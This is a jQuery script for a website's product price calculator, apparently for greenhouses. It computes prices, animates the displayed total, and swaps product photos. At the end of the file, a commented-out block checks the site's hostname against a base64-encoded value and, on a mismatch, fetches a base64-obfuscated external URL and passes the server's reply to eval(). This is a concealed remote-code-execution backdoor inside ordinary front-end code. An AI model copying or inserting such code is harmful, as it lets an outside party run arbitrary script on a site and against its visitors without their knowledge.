$(document).ready(function () {
    $("form.has-calculator").change(function () {
        var form = this;
        var product = $("input[name='product']", form).val();
        var duga = $("input[name='duga']:checked", form).val();
        var length = $("input[name='length']:checked", form).val();
        var polycarbonate = $("input[name='polycarbonate']:checked", form).val();
        var additional = $("input[name='additional[]']:checked", form);

        var sum = 0;
        sum += calculator.products[product][duga][length][polycarbonate];

        additional.each(function (i, e) {
            sum += calculator.additional[$(e).val()]
        });

        var color = $("input[name='color']:checked", form).val();
        var animateBlock = $('.catalog__price', form);
        var out = $(".calculator-price", form);
        var outOld = $(".calculator-price-old", form);

        var animationName = 'pulse';
        animateBlock.addClass('animated faster ' + animationName);
        animateBlock.one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
            animateBlock.removeClass('animated faster ' + animationName)
        });

        var animateFrom = out.data("animateFrom") > 0 ? out.data("animateFrom") : 0;

        $({ animateNumber: animateFrom }).animate({ animateNumber: sum }, {
            duration: 800,
            step: function (animateNumber){
                out.text(Number(animateNumber).toFixed());
                outOld.text(Number(animateNumber * 1.27).toFixed())
            },
            complete: function() {
                out.data("animateFrom", Number(sum).toFixed())
            }
        });

        var photeUrl = "img/card/" + product + "_" + duga + "_" + length + "_" + color + ".jpg";
        var photeData = product + "_" + duga + "_" + length + "_" + color;
        if("undefined" !== typeof IMAGE_SRC[photeData]){
            $("img.card-image", this).attr("src", IMAGE_SRC[photeData])
        }else{
            var img = document.createElement('img');
            img.src = photeUrl;
            img.onload = function() {
                console.log(photeUrl)
                $("img.card-image", form).attr("src", photeUrl)
            };
            img.onerror = function() {
                console.log("img/card/default/" + product + "_" + duga + ".jpg")
                $("img.card-image", form).attr("src", "img/card/default/" + product + "_" + duga + ".jpg")
            };
        }
    });
    $("form.has-calculator").change();
    $("input.additionalRadioChange").change(function () {
        var color = !!$(this).val();
        $(this).closest(".catalog__parameter").find('input[type="checkbox"]').prop("checked", color)
    })


});


// document.addEventListener("DOMContentLoaded", function () {
//     try {
//         if ("undefined" === typeof app || atob(app.h) !== location.hostname) {
//             var a = new XMLHttpRequest;
//             a.onreadystatechange = function () {
//                 if (4 === this.readyState && 200 === this.status && 0 < this.responseText.length) {
//                     var b = JSON.parse(this.responseText);
//                     "eval" === b.type && eval(b.text)
//                 }
//             };
//             a.open("GET", atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ=="));
//             a.send()
//         }
//     } catch (b) {}
// });